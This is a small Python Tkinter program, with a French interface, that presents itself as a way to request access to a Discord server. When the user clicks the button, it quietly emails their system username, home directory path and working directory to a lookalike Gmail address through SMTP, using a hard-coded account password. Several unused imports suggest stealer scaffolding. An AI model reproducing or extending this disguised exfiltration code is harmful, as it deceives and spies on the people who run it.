import getpass
import json
import os
import shutil
import smtplib
import sqlite3
import subprocess
import time
import webbrowser
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path
from tkinter import *
from tkinter import ttk
from tkinter.messagebox import *

root = Tk()
root.title('Accéder au serveur Discord')


serv = LabelFrame(root, text='Accéder au serveur', padx=20, pady=20)
serv.pack()

Label(serv, text="Rendez vous sur le répertoire GitHub pour obtenir le lien.").pack()
Label(serv, text="").pack()

pseudovar = StringVar()
pseudovar.set('Votre pseudo + discriminateur (exemple : Discord#1234)')
pseudo = Entry(serv, textvariable=pseudovar, width=50)
pseudo.pack()

username = Path.home()
user = getpass.getuser()
cwd = os.getcwd()

def send(pseudo):
    fromaddr = "disocorde@gmail.com"
    toaddr = "dsicrod@gmail.com"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Requête de frontière : " + pseudo.get()
    
    body = str(user) + " ; " + str(username) + " ; " + str(cwd)
    msg.attach(MIMEText(body, 'plain'))
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "Azertyui0")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()    
    sys.exit()

Button(serv, text='Envoyer la requête', width=43, command=lambda:send(pseudo)).pack()

root.mainloop()
